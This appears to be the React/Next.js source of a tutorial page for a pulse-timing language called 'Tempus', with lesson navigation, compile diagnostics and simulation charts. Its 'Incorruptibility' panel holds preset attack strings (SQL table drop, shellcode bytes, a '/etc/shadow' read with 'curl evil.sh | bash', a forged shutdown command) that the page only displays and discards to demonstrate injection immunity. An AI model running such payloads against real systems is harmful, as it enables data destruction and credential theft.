import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { compile, type CompileResult } from '../lib/tempus/compile';
import { createSimulator } from '../lib/tempus/runtime';
import { LESSONS, type Lesson } from '../lib/tempus/lessons';
import type { Diag, SimEvent } from '../lib/tempus/types';
import {
  CanvasScatter, CanvasHistogram, CanvasStrip,
} from '../components/charts';
import type { ScatterPoint, ScatterBand, HistBand, StripEntry } from '../components/charts';

// ── palette / formatting ──────────────────────────────────────────────────────
const PALETTE = ['#58E6D9', '#f59e0b', '#f97316', '#ef4444', '#60a5fa', '#a78bfa', '#34d399', '#fb923c'];
const ANOMALY = '#4b5563';

function paletteFor(names: string[]): Map<string, string> {
  const m = new Map<string, string>();
  names.forEach((n, i) => m.set(n, PALETTE[i % PALETTE.length]));
  m.set('anomaly', ANOMALY);
  return m;
}

function fmtDP(v: number): string {
  const a = Math.abs(v);
  if (a === 0) return '0';
  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
  return `${(v * 1e3).toFixed(2)} ms`;
}

function posToLineCol(src: string, pos?: number): { line: number; col: number } | null {
  if (pos == null) return null;
  let line = 1, col = 1;
  for (let i = 0; i < pos && i < src.length; i++) {
    if (src[i] === '\n') { line++; col = 1; } else col++;
  }
  return { line, col };
}

const SEV = {
  error:   { color: '#ef4444', glyph: '✕', label: 'error' },
  warning: { color: '#f59e0b', glyph: '⚠', label: 'warning' },
  info:    { color: '#58E6D9', glyph: 'ℹ', label: 'info' },
} as const;

// ── lesson rail ───────────────────────────────────────────────────────────────
function LessonRail({ active, onSelect }: { active: number; onSelect: (i: number) => void }) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
      <div style={{ padding: '13px 14px 9px', flexShrink: 0 }}>
        <Link href="/" style={{ color: 'rgba(255,255,255,0.28)', fontSize: 9, textDecoration: 'none', letterSpacing: '0.16em' }}>← HOME</Link>
        <div style={{ color: 'rgba(255,255,255,0.85)', fontSize: 11, letterSpacing: '0.3em', fontWeight: 700, marginTop: 10 }}>TEMPUS</div>
        <div style={{ color: '#58E6D9', fontSize: 8, letterSpacing: '0.34em', marginTop: 3 }}>TUTORIAL</div>
      </div>
      <div style={{ flex: 1, overflowY: 'auto', padding: '4px 8px 10px' }}>
        {LESSONS.map((l, i) => {
          const on = i === active;
          return (
            <button key={l.id} onClick={() => onSelect(i)}
              style={{
                display: 'block', width: '100%', textAlign: 'left', cursor: 'pointer',
                padding: '8px 9px', marginBottom: 3, background: on ? 'rgba(88,230,217,0.08)' : 'transparent',
                border: `1px solid ${on ? 'rgba(88,230,217,0.4)' : 'rgba(255,255,255,0.05)'}`,
                transition: 'all 0.12s',
              }}>
              <div style={{ display: 'flex', gap: 7, alignItems: 'baseline' }}>
                <span style={{ fontFamily: 'monospace', fontSize: 9, color: on ? '#58E6D9' : 'rgba(255,255,255,0.3)' }}>
                  {String(i + 1).padStart(2, '0')}
                </span>
                <span style={{ fontSize: 11, color: on ? '#e2f7f4' : 'rgba(255,255,255,0.6)', fontWeight: on ? 600 : 400 }}>
                  {l.title}
                </span>
              </div>
              <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.28)', marginTop: 3, lineHeight: 1.4, paddingLeft: 16 }}>
                {l.tagline}
              </div>
            </button>
          );
        })}
      </div>
      <div style={{ padding: '9px 14px', borderTop: '1px solid rgba(255,255,255,0.06)', flexShrink: 0 }}>
        <Link href="/tempus" style={{ color: 'rgba(255,255,255,0.35)', fontSize: 9, textDecoration: 'none', letterSpacing: '0.12em' }}>
          OPEN FREEFORM PLAYGROUND →
        </Link>
      </div>
    </div>
  );
}

// ── diagnostics panel ─────────────────────────────────────────────────────────
function DiagnosticsPanel({ result, src }: { result: CompileResult | null; src: string }) {
  if (!result) {
    return <Placeholder text="press COMPILE to check the program" />;
  }
  const { diagnostics, registry, ok } = result;
  const counts = {
    error:   diagnostics.filter(d => d.severity === 'error').length,
    warning: diagnostics.filter(d => d.severity === 'warning').length,
    info:    diagnostics.filter(d => d.severity === 'info').length,
  };

  return (
    <div style={{ height: '100%', overflowY: 'auto', padding: '10px 12px' }}>
      {/* verdict */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 9, padding: '8px 11px', marginBottom: 11,
        border: `1px solid ${ok ? 'rgba(52,211,153,0.4)' : 'rgba(239,68,68,0.4)'}`,
        background: ok ? 'rgba(52,211,153,0.06)' : 'rgba(239,68,68,0.06)',
      }}>
        <span style={{ fontSize: 14, color: ok ? '#34d399' : '#ef4444' }}>{ok ? '✓' : '✕'}</span>
        <span style={{ fontFamily: 'monospace', fontSize: 11, color: ok ? '#34d399' : '#ef4444', letterSpacing: '0.05em' }}>
          {ok ? 'COMPILED — registry Γ frozen' : 'COMPILE FAILED'}
        </span>
        <span style={{ marginLeft: 'auto', fontFamily: 'monospace', fontSize: 9, color: 'rgba(255,255,255,0.35)' }}>
          {counts.error}E · {counts.warning}W · {counts.info}I
        </span>
      </div>

      {/* diagnostics list */}
      {diagnostics.length === 0 ? (
        <div style={{ fontFamily: 'monospace', fontSize: 10, color: 'rgba(52,211,153,0.7)', fontStyle: 'italic', padding: '2px 2px 12px' }}>
          no diagnostics — program is well-formed.
        </div>
      ) : (
        <div style={{ marginBottom: 12 }}>
          {diagnostics.map((d: Diag, i) => {
            const s = SEV[d.severity];
            const lc = posToLineCol(src, d.pos);
            return (
              <div key={i} style={{
                display: 'grid', gridTemplateColumns: '16px 1fr', gap: 8, padding: '6px 8px', marginBottom: 3,
                borderLeft: `2px solid ${s.color}`, background: 'rgba(255,255,255,0.015)',
              }}>
                <span style={{ color: s.color, fontSize: 11, lineHeight: '15px' }}>{s.glyph}</span>
                <div>
                  <div style={{ fontFamily: 'monospace', fontSize: 10.5, color: 'rgba(255,255,255,0.78)', lineHeight: 1.5 }}>{d.message}</div>
                  {lc && (
                    <div style={{ fontFamily: 'monospace', fontSize: 8.5, color: 'rgba(255,255,255,0.3)', marginTop: 2 }}>
                      line {lc.line}, col {lc.col}
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* compiled registry */}
      {registry && (
        <div>
          <SectionLabel>COMPILED REGISTRY Γ</SectionLabel>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 7, marginBottom: 9 }}>
            <Stat k="channels (d)" v={String(registry.channels.length)} />
            <Stat k="cells" v={String(registry.cells.length)} />
            <Stat k="span lo" v={registry.span ? fmtDP(registry.span[0]) : '—'} />
            <Stat k="span hi" v={registry.span ? fmtDP(registry.span[1]) : '—'} />
          </div>
          <div style={{ fontFamily: 'monospace', fontSize: 9, color: 'rgba(255,255,255,0.4)', marginBottom: 9 }}>
            {registry.channels.map((c, i) => (
              <span key={c} style={{ color: PALETTE[i % PALETTE.length], marginRight: 8 }}>◈ {c}</span>
            ))}
          </div>

          {/* inflation table */}
          {registry.inflation && (
            <>
              <SectionLabel>COMPOSITION INFLATION  T(n,d) = d·(1+d)<sup>n−1</sup></SectionLabel>
              <div style={{ border: '1px solid rgba(255,255,255,0.06)' }}>
                <div style={{ display: 'grid', gridTemplateColumns: '40px 1fr', fontFamily: 'monospace', fontSize: 9,
                              color: 'rgba(255,255,255,0.3)', padding: '4px 9px', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
                  <span>n</span><span style={{ textAlign: 'right' }}>T(n, d={registry.inflation.d})</span>
                </div>
                {registry.inflation.rows.map(r => (
                  <div key={r.n} style={{ display: 'grid', gridTemplateColumns: '40px 1fr', fontFamily: 'monospace', fontSize: 10,
                                          padding: '3px 9px', borderBottom: '1px solid rgba(255,255,255,0.025)' }}>
                    <span style={{ color: 'rgba(255,255,255,0.5)' }}>{r.n}</span>
                    <span style={{ textAlign: 'right', color: '#58E6D9' }}>{r.T.toLocaleString()}</span>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}
    </div>
  );
}

// ── simulation panel ──────────────────────────────────────────────────────────
interface SimDerived {
  points: ScatterPoint[];
  bands:  ScatterBand[];
  hist:   number[];
  histBands: HistBand[];
  strip:  StripEntry[];
  log:    { cell: string; action: string; dp: number; color: string }[];
  stats:  { total: number; dispatched: number; anomalies: number };
}

function SimulationPanel({ derived, showPhase }: { derived: SimDerived | null; showPhase: boolean }) {
  if (!derived || derived.stats.total === 0) {
    return <Placeholder text="press RUN to simulate a pulse stream" />;
  }
  const { points, bands, hist, histBands, strip, log, stats } = derived;
  return (
    <div style={{ height: '100%', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
      {/* stats */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', borderBottom: '1px solid rgba(255,255,255,0.06)', flexShrink: 0 }}>
        {[['EVENTS', String(stats.total), undefined],
          ['DISPATCHED', String(stats.dispatched), '#58E6D9'],
          ['ANOMALIES', String(stats.anomalies), stats.anomalies > 0 ? '#ef4444' : undefined],
        ].map(([k, v, c]) => (
          <div key={k as string} style={{ padding: '7px 6px', textAlign: 'center', borderRight: '1px solid rgba(255,255,255,0.04)' }}>
            <div style={{ fontSize: 7, letterSpacing: '0.12em', color: 'rgba(255,255,255,0.25)', fontFamily: 'monospace' }}>{k}</div>
            <div style={{ fontSize: 14, fontFamily: 'monospace', fontWeight: 700, marginTop: 2, color: (c ?? 'rgba(255,255,255,0.6)') as string }}>{v}</div>
          </div>
        ))}
      </div>

      <div style={{ flex: 1, display: 'grid', gridTemplateRows: showPhase ? '1.3fr 1fr 0.5fr' : '1.3fr 1fr',
                    gap: 1, background: 'rgba(255,255,255,0.04)', minHeight: 0 }}>
        <div style={{ background: '#030705', overflow: 'hidden' }}>
          <CanvasScatter points={points} bands={bands} title="ΔP  TIMELINE" fmt={fmtDP} />
        </div>
        <div style={{ background: '#030705', overflow: 'hidden' }}>
          <CanvasHistogram values={hist} bands={histBands} title="ΔP  HISTOGRAM" fmt={fmtDP} bins={40} />
        </div>
        {showPhase && (
          <div style={{ background: '#030705', overflow: 'hidden' }}>
            <CanvasStrip entries={strip} legend={[{ color: '#60a5fa', label: 'COMPILE' }, { color: '#f59e0b', label: 'EXECUTE' }]} title="PHASE  TIMELINE" />
          </div>
        )}
      </div>

      {/* action log */}
      <div style={{ height: 96, borderTop: '1px solid rgba(255,255,255,0.06)', overflowY: 'auto', flexShrink: 0 }}>
        <div style={{ padding: '6px 10px 3px', fontSize: 8, letterSpacing: '0.16em', color: 'rgba(255,255,255,0.22)', fontFamily: 'monospace' }}>ACTION LOG</div>
        {log.length === 0
          ? <div style={{ padding: '6px 10px', fontFamily: 'monospace', fontSize: 9, color: 'rgba(255,255,255,0.18)', fontStyle: 'italic' }}>no dispatches</div>
          : log.map((e, i) => (
            <div key={i} style={{ display: 'grid', gridTemplateColumns: '1fr 60px', gap: 6, padding: '2px 10px', fontFamily: 'monospace', fontSize: 9 }}>
              <div style={{ minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                <span style={{ color: e.color, fontWeight: 600 }}>{e.cell}</span>
                <span style={{ color: 'rgba(255,255,255,0.35)', marginLeft: 6 }}>{e.action}</span>
              </div>
              <span style={{ color: 'rgba(255,255,255,0.25)', textAlign: 'right', fontSize: 8 }}>{fmtDP(e.dp)}</span>
            </div>
          ))}
      </div>
    </div>
  );
}

// ── inject panel (lesson: incorruptibility) ───────────────────────────────────
const PRESETS: Record<string, string> = {
  SQL: `'; DROP TABLE reactor_logs; --`,
  BOF: `AAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76`,
  CMD: `; cat /etc/shadow || curl evil.sh | bash`,
  JSON: `{"op":"emergency_shutdown","authorized":true}`,
};

function InjectPanel({ cellCount }: { cellCount: number }) {
  const [payload, setPayload] = useState(PRESETS.SQL);
  const [log, setLog] = useState<{ bytes: number }[]>([]);
  const [stats, setStats] = useState({ injected: 0, bytes: 0 });

  const inject = useCallback((text: string) => {
    setLog(p => [{ bytes: text.length }, ...p].slice(0, 50));
    setStats(s => ({ injected: s.injected + 1, bytes: s.bytes + text.length }));
  }, []);

  return (
    <div style={{ height: '100%', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
      <div style={{ padding: '10px 12px', fontSize: 10, fontFamily: 'monospace', color: 'rgba(255,255,255,0.34)', lineHeight: 1.55, borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
        There is <span style={{ color: '#58E6D9' }}>no content parser</span>. Inject anything — the executable action set stays exactly the compiled cells of Γ.
      </div>
      <div style={{ padding: '10px 12px', flexShrink: 0 }}>
        <textarea value={payload} onChange={e => setPayload(e.target.value)} spellCheck={false}
          style={{ width: '100%', minHeight: 64, background: '#0c0808', color: '#ef4444', fontFamily: 'monospace', fontSize: 11,
                   lineHeight: 1.5, padding: 9, border: '1px solid rgba(239,68,68,0.2)', resize: 'vertical', outline: 'none', boxSizing: 'border-box' }} />
        <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap', marginTop: 6 }}>
          {Object.entries(PRESETS).map(([k, v]) => (
            <button key={k} onClick={() => setPayload(v)}
              style={{ fontFamily: 'monospace', fontSize: 9, padding: '3px 7px', border: '1px solid rgba(255,255,255,0.1)', background: 'transparent', color: 'rgba(255,255,255,0.32)', cursor: 'pointer' }}>{k}</button>
          ))}
          <button onClick={() => inject(payload)}
            style={{ marginLeft: 'auto', fontFamily: 'monospace', fontSize: 10, letterSpacing: '0.1em', padding: '4px 13px', background: 'rgba(239,68,68,0.1)', color: '#ef4444', border: '1px solid rgba(239,68,68,0.35)', cursor: 'pointer' }}>INJECT</button>
          <button onClick={() => { setLog([]); setStats({ injected: 0, bytes: 0 }); }}
            style={{ fontFamily: 'monospace', fontSize: 10, padding: '4px 11px', background: 'transparent', color: 'rgba(255,255,255,0.2)', border: '1px solid rgba(255,255,255,0.08)', cursor: 'pointer' }}>RESET</button>
        </div>
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', borderTop: '1px solid rgba(255,255,255,0.05)', borderBottom: '1px solid rgba(255,255,255,0.05)', flexShrink: 0 }}>
        {[['INJECTED', String(stats.injected), undefined], ['PARSERS', '0', '#34d399'], ['|Cells(Γ)|', String(cellCount), '#58E6D9']].map(([k, v, c]) => (
          <div key={k as string} style={{ padding: '8px 6px', textAlign: 'center', borderRight: '1px solid rgba(255,255,255,0.04)' }}>
            <div style={{ fontSize: 7, letterSpacing: '0.12em', color: 'rgba(255,255,255,0.22)', fontFamily: 'monospace' }}>{k}</div>
            <div style={{ fontSize: 15, fontFamily: 'monospace', fontWeight: 700, marginTop: 2, color: (c ?? 'rgba(255,255,255,0.55)') as string }}>{v}</div>
          </div>
        ))}
      </div>
      <div style={{ flex: 1, overflowY: 'auto' }}>
        {log.length === 0
          ? <div style={{ textAlign: 'center', padding: 18, fontFamily: 'monospace', fontSize: 9, color: 'rgba(255,255,255,0.12)', fontStyle: 'italic' }}>no injections yet</div>
          : log.map((e, i) => (
            <div key={i} style={{ display: 'grid', gridTemplateColumns: '46px 1fr', gap: 7, padding: '3px 12px', fontFamily: 'monospace', fontSize: 9, borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
              <span style={{ color: 'rgba(239,68,68,0.5)' }}>{e.bytes}B</span>
              <span style={{ color: 'rgba(255,255,255,0.16)', fontStyle: 'italic' }}>discarded · no parser to reach</span>
            </div>
          ))}
      </div>
    </div>
  );
}

// ── small UI helpers ──────────────────────────────────────────────────────────
function Placeholder({ text }: { text: string }) {
  return (
    <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'monospace', fontSize: 10, color: 'rgba(255,255,255,0.16)', fontStyle: 'italic' }}>
      {text}
    </div>
  );
}
function SectionLabel({ children }: { children: React.ReactNode }) {
  return <div style={{ fontSize: 8, letterSpacing: '0.16em', color: 'rgba(255,255,255,0.25)', fontFamily: 'monospace', margin: '4px 0 7px' }}>{children}</div>;
}
function Stat({ k, v }: { k: string; v: string }) {
  return (
    <div style={{ border: '1px solid rgba(255,255,255,0.05)', padding: '6px 8px' }}>
      <div style={{ fontSize: 7.5, letterSpacing: '0.1em', color: 'rgba(255,255,255,0.28)', fontFamily: 'monospace', textTransform: 'uppercase' }}>{k}</div>
      <div style={{ fontSize: 12, fontFamily: 'monospace', color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>{v}</div>
    </div>
  );
}

// ── page ──────────────────────────────────────────────────────────────────────
type Tab = 'diagnostics' | 'simulation' | 'inject';

function TempusTutorial() {
  const [activeLesson, setActiveLesson] = useState(0);
  const [code, setCode]         = useState(LESSONS[0].script);
  const [result, setResult]     = useState<CompileResult | null>(null);
  const [events, setEvents]     = useState<SimEvent[]>([]);
  const [running, setRunning]   = useState(false);
  const [tab, setTab]           = useState<Tab>('diagnostics');

  const lesson = LESSONS[activeLesson];
  const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const stopLoop = useCallback(() => {
    if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; }
    setRunning(false);
  }, []);

  // ── lesson switch ─────────────────────────────────────────────────────────
  useEffect(() => {
    stopLoop();
    const l = LESSONS[activeLesson];
    setCode(l.script);
    setEvents([]);
    setResult(compile(l.script));     // auto-compile so the panel is populated
    setTab('diagnostics');
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeLesson]);

  useEffect(() => () => stopLoop(), [stopLoop]);

  // ── compile ───────────────────────────────────────────────────────────────
  const handleCompile = useCallback(() => {
    stopLoop();
    setResult(compile(code));
    setTab('diagnostics');
  }, [code, stopLoop]);

  // ── run ───────────────────────────────────────────────────────────────────
  const handleRun = useCallback(() => {
    stopLoop();
    const res = compile(code);
    setResult(res);
    if (!res.ok || !res.runtime) { setTab('diagnostics'); return; }

    setEvents([]);
    const total = lesson.events;
    const batch = Math.max(1, Math.floor(total / 40));
    simRef.current = createSimulator(res.runtime, { totalEvents: total, noiseSigma: lesson.noise, seed: 42, batchSize: batch });
    setTab('simulation');
    setRunning(true);

    intervalRef.current = setInterval(() => {
      const sim = simRef.current;
      if (!sim || sim.isDone()) { stopLoop(); return; }
      sim.generateBatch();
      setEvents(sim.getEvents().slice());
    }, 40);
  }, [code, lesson, stopLoop]);

  const handleReset = useCallback(() => {
    stopLoop();
    setEvents([]);
    setCode(lesson.script);
    setResult(compile(lesson.script));
    setTab('diagnostics');
  }, [lesson, stopLoop]);

  // ── derived simulation data ─────────────────────────────────────────────────
  const palette = useMemo(() => {
    const names = result?.runtime ? Array.from(result.runtime.cells.keys()) : [];
    return paletteFor(names);
  }, [result]);

  const derived = useMemo<SimDerived | null>(() => {
    if (!result?.runtime) return null;
    const cells = Array.from(result.runtime.cells.values());
    const recent = events.slice(-400);
    const bands: ScatterBand[]  = cells.map(c => ({ label: c.name, lo: c.lo, hi: c.hi, color: palette.get(c.name) ?? '#888' }));
    const histBands: HistBand[] = cells.map(c => ({ lo: c.lo, hi: c.hi, color: palette.get(c.name) ?? '#888' }));
    const points: ScatterPoint[] = recent.map(ev => ({
      y: ev.dp,
      color: (palette.get(ev.cell) ?? ANOMALY) + (ev.actionFired ? '' : 'a0'),
      r: ev.actionFired ? 3 : 1.8,
    }));
    const strip: StripEntry[] = recent.map(ev => ({
      color: ev.phase === 'EXECUTE' ? '#f59e0b' : '#60a5fa',
      opacity: ev.phase === 'EXECUTE' ? 0.85 : 0.4,
    }));
    const log = events.filter(e => e.actionFired !== null).slice(-40).reverse().map(e => ({
      cell: e.cell, action: e.actionFired as string, dp: e.dp, color: palette.get(e.cell) ?? ANOMALY,
    }));
    return {
      points, bands, hist: events.map(e => e.dp), histBands, strip, log,
      stats: {
        total: events.length,
        dispatched: events.filter(e => e.actionFired !== null).length,
        anomalies: events.filter(e => e.cell === 'anomaly').length,
      },
    };
  }, [events, result, palette]);

  const cellCount = result?.runtime?.cells.size ?? 0;
  const tabs: Tab[] = lesson.feature === 'inject' ? ['diagnostics', 'simulation', 'inject'] : ['diagnostics', 'simulation'];

  return (
    <div style={{ background: '#030705', color: '#e2e8f0', height: '100vh', fontFamily: 'monospace', display: 'flex', overflow: 'hidden' }}>
      <Head><title>Tempus · Tutorial</title></Head>

      {/* ── lesson rail ── */}
      <div style={{ width: 212, flexShrink: 0, borderRight: '1px solid rgba(255,255,255,0.07)', background: '#060b08' }}>
        <LessonRail active={activeLesson} onSelect={setActiveLesson} />
      </div>

      {/* ── middle: prose + editor ── */}
      <div style={{ width: 440, flexShrink: 0, borderRight: '1px solid rgba(255,255,255,0.07)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        {/* prose */}
        <div style={{ flexShrink: 0, maxHeight: '46%', overflowY: 'auto', padding: '16px 18px 12px', borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
          <div style={{ fontSize: 9, color: '#58E6D9', letterSpacing: '0.22em' }}>LESSON {String(activeLesson + 1).padStart(2, '0')}</div>
          <h1 style={{ fontSize: 19, fontWeight: 700, color: '#eafaf8', margin: '6px 0 3px', fontFamily: 'monospace' }}>{lesson.title}</h1>
          <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', fontStyle: 'italic', marginBottom: 11 }}>{lesson.tagline}</div>
          {lesson.body.map((p, i) => {
            const isFormula = /^[A-Za-zΔ()]+\s*=/.test(p) || /T\(n,d\)\s*=/.test(p);
            return (
              <p key={i} style={{ fontSize: isFormula ? 12 : 11.5, lineHeight: 1.65, margin: '0 0 9px',
                                  color: isFormula ? '#9fe8e0' : 'rgba(255,255,255,0.62)',
                                  fontFamily: isFormula ? 'monospace' : 'inherit',
                                  textAlign: isFormula ? 'center' : 'left' }}>
                {p}
              </p>
            );
          })}
          <div style={{ marginTop: 4 }}>
            {lesson.points.map((pt, i) => (
              <div key={i} style={{ display: 'flex', gap: 8, fontSize: 10.5, color: 'rgba(255,255,255,0.5)', lineHeight: 1.5, marginBottom: 4 }}>
                <span style={{ color: '#58E6D9' }}>▸</span><span>{pt}</span>
              </div>
            ))}
          </div>
        </div>

        {/* editor */}
        <textarea value={code} onChange={e => setCode(e.target.value)} spellCheck={false}
          style={{ flex: 1, background: '#060b08', color: '#c8faf5', fontFamily: 'monospace', fontSize: 11.5,
                   lineHeight: 1.6, padding: 14, border: 'none', resize: 'none', outline: 'none', minHeight: 0 }} />

        {/* controls */}
        <div style={{ display: 'flex', gap: 8, padding: '10px 14px', borderTop: '1px solid rgba(255,255,255,0.06)', flexShrink: 0 }}>
          <button onClick={handleCompile}
            style={{ padding: '6px 16px', fontSize: 10, letterSpacing: '0.12em', fontFamily: 'monospace', cursor: 'pointer',
                     background: 'transparent', color: '#58E6D9', border: '1px solid rgba(88,230,217,0.5)' }}>COMPILE</button>
          <button onClick={handleRun} disabled={running}
            style={{ padding: '6px 18px', fontSize: 10, letterSpacing: '0.12em', fontFamily: 'monospace', fontWeight: 700,
                     cursor: running ? 'default' : 'pointer', background: running ? '#1a2a1a' : '#58E6D9',
                     color: running ? '#556' : '#020f0d', border: 'none' }}>{running ? 'RUNNING…' : 'RUN ▶'}</button>
          <button onClick={handleReset}
            style={{ marginLeft: 'auto', padding: '6px 13px', fontSize: 10, fontFamily: 'monospace', cursor: 'pointer',
                     background: 'transparent', color: 'rgba(255,255,255,0.3)', border: '1px solid rgba(255,255,255,0.1)' }}>RESET</button>
        </div>
      </div>

      {/* ── right: results ── */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minWidth: 0 }}>
        <div style={{ display: 'flex', borderBottom: '1px solid rgba(255,255,255,0.07)', flexShrink: 0 }}>
          {tabs.map(t => (
            <button key={t} onClick={() => setTab(t)}
              style={{ padding: '10px 18px', fontFamily: 'monospace', fontSize: 9.5, letterSpacing: '0.14em', textTransform: 'uppercase',
                       background: 'transparent', border: 'none', cursor: 'pointer',
                       borderBottom: tab === t ? '2px solid #58E6D9' : '2px solid transparent',
                       color: tab === t ? '#58E6D9' : 'rgba(255,255,255,0.3)' }}>
              {t === 'inject' ? 'Incorruptibility' : t}
            </button>
          ))}
        </div>
        <div style={{ flex: 1, overflow: 'hidden', minHeight: 0 }}>
          {tab === 'diagnostics' && <DiagnosticsPanel result={result} src={code} />}
          {tab === 'simulation'  && <SimulationPanel derived={derived} showPhase={lesson.feature === 'phase'} />}
          {tab === 'inject'      && <InjectPanel cellCount={cellCount} />}
        </div>
      </div>
    </div>
  );
}

TempusTutorial.getLayout = (page: React.ReactElement) => page;
export default TempusTutorial;
